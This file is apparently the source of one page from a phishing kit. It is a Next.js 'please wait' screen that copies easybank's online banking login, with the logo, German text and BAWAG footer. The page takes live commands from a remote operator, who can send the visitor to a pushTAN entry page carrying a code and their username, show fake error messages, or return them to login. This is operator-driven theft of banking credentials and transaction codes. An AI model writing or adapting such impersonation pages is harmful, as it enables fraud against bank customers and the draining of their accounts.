"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { onCommand } from "@/lib/track";

export default function WaitingScreen({ user }: { user: string }) {
  const router = useRouter();
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    onCommand((cmd) => {
      switch (cmd.type) {
        case "forward_to_tan": {
          const code = (cmd.payload as { code?: string }).code || "";
          router.push(`/pushtan?code=${encodeURIComponent(code)}&user=${encodeURIComponent(user)}`);
          break;
        }
        case "back_to_login":
          router.push("/");
          break;
        case "show_error":
          setError((cmd.payload as { message?: string }).message || "Ein Fehler ist aufgetreten.");
          break;
        case "clear_error":
          setError(null);
          break;
      }
    });
    return () => onCommand(() => {});
  }, [router, user]);

  return (
    <div id="wrapper">
      {/* HEADER */}
      <div id="header">
        <div id="upper-header" className="tright">
          <div id="logo" className="fleft first">
            <a href="https://www.easybank.at/" target="_blank" aria-label="easybank Webseite">
              <img src="/easybank/logo-easybank_de.png" id="logo-easybank" alt="" />
            </a>
          </div>
          <div className="fleft second">
            <div id="wrap-menue">
              <ul>
                <li className="help"><a href="#">Hilfe</a></li>
                <li className="last">
                  <select className="language-switcher" defaultValue="de" suppressHydrationWarning>
                    <option value="de">deutsch</option>
                    <option value="en">english</option>
                  </select>
                </li>
              </ul>
            </div>
            <div id="date-display" className="tright">Samstag, 09.05.2026 - 08:44</div>
          </div>
        </div>
        <div id="main-navigation">
          <div id="navi"><ul></ul></div>
        </div>
      </div>

      {/* CONTENT */}
      <div id="content" className="isloggedout promo">
        <div id="login" className="clearfix">
          {/* LEFT COLUMN */}
          <div className="column-first" id="login-input">
            <div className="green-box" id="boxGreen1">
              {/* Green header */}
              <div className="green-box-header" style={{ height: 40 }}>
                <div className="login-left"></div>
                <div className="login-repeat">
                  <label>Bitte warten</label>
                </div>
                <div className="login-right"></div>
              </div>

              {/* Content */}
              <div className="box-content">
                {/* Error banner */}
                {error && (
                  <div
                    style={{
                      backgroundColor: "#fdeaea",
                      color: "#990000",
                      border: "1px solid #f5c6cb",
                      borderRadius: "5px",
                      padding: "10px 14px",
                      marginBottom: "12px",
                      fontSize: "0.95em",
                    }}
                  >
                    {error}
                  </div>
                )}

                <p style={{ paddingBottom: 10 }}>
                  Ihre Anmeldung wird bearbeitet. Bitte haben Sie einen Moment Geduld.
                </p>

                {/* Spinner */}
                <div style={{ textAlign: "center", padding: "36px 0 44px" }}>
                  <svg
                    width="56"
                    height="56"
                    viewBox="0 0 56 56"
                    style={{ animation: "spin 1.2s linear infinite" }}
                  >
                    <circle
                      cx="28"
                      cy="28"
                      r="24"
                      fill="none"
                      stroke="#e0e0e0"
                      strokeWidth="4"
                    />
                    <circle
                      cx="28"
                      cy="28"
                      r="24"
                      fill="none"
                      stroke="#177991"
                      strokeWidth="4"
                      strokeDasharray="150.8"
                      strokeDashoffset="113.1"
                      strokeLinecap="round"
                    />
                  </svg>
                  <p
                    style={{
                      fontSize: "0.85em",
                      color: "#676767",
                      marginTop: 14,
                    }}
                  >
                    Verbindung wird hergestellt...
                  </p>
                </div>
              </div>
              <div className="box-footer"></div>
            </div>
          </div>

          {/* RIGHT COLUMN */}
          <div className="column-third" id="login-info">
            <div style={{ position: "relative" }} className="top clearfix">
              {/* Box 1 -- Warnung */}
              <div className="info-box">
                <div className="login-info-top"></div>
                <div className="login-info-repeat-x">
                  <h3>Warnung</h3>
                  <div className="stripline"></div>
                  <div className="notification-text">
                    <strong>Achtung vor Phishing</strong><br />
                    Wir fordern Sie niemals per E-Mail oder SMS auf, TANs, Kodes, Kreditkarten-Daten einzugeben oder zu best&auml;tigen!<br />
                    <a href="#" target="_blank" style={{ color: "#4B9920", marginTop: 5, display: "inline-block" }}>Weiterlesen</a>
                  </div>
                </div>
                <div className="login-info-bottom"></div>
              </div>

              {/* Box 2 -- Hilfe/Hotline */}
              <div className="info-box">
                <div className="login-info-top"></div>
                <div className="login-info-repeat-x">
                  <h3>Hilfe/Hotline</h3>
                  <div className="stripline"></div>
                  <ul>
                    <li><a href="#" target="_blank">PIN vergessen oder Verf&uuml;ger gesperrt?</a></li>
                    <li><a href="#" target="_blank">FAQ</a></li>
                  </ul>
                </div>
                <div className="login-info-bottom"></div>
              </div>

              {/* Box 3 -- Info */}
              <div className="info-box last">
                <div className="login-info-top"></div>
                <div className="login-info-repeat-x">
                  <h3>Info</h3>
                  <div className="stripline"></div>
                  <ul>
                    <li><a href="#" target="_blank"><strong>Bestellung PIN-Code f&uuml;r Debitkarte</strong></a></li>
                    <li><a href="#" target="_blank">Alle Infos zur<br />easybank App</a></li>
                    <li><a href="#" target="_blank">Zu Watchlist Internet</a></li>
                  </ul>
                </div>
                <div className="login-info-bottom"></div>
              </div>
            </div>

            {/* Promo */}
            <div className="promo-area">
              <a href="#" target="_blank">
                <img src="/easybank/EASY26016_login.jpg" alt="Promo" width={564} height={170} />
              </a>
            </div>
          </div>
        </div>
      </div>

      {/* FOOTER */}
      <div id="footer">
        <div className="footer-navigation">
          <div className="footer-first"></div>
          <div className="footer-second">
            <ul>
              <li style={{ width: 84 }}><a href="#" target="_blank">Impressum</a></li>
              <li style={{ width: 47 }}><a href="#" target="_blank">AGB</a></li>
              <li style={{ width: 92 }}><a href="#" target="_blank">Datenschutz</a></li>
              <li style={{ width: 150 }}><a href="#" target="_blank">Nutzungsbedingungen</a></li>
              <li style={{ width: 84 }}><a href="#" target="_blank">Barrierefrei</a></li>
              <li className="last-footer" style={{ width: 119 }}>&copy; BAWAG P.S.K.</li>
            </ul>
          </div>
        </div>
      </div>
      <div id="spacer-footer"></div>

      <style>{`
        @keyframes spin {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
}
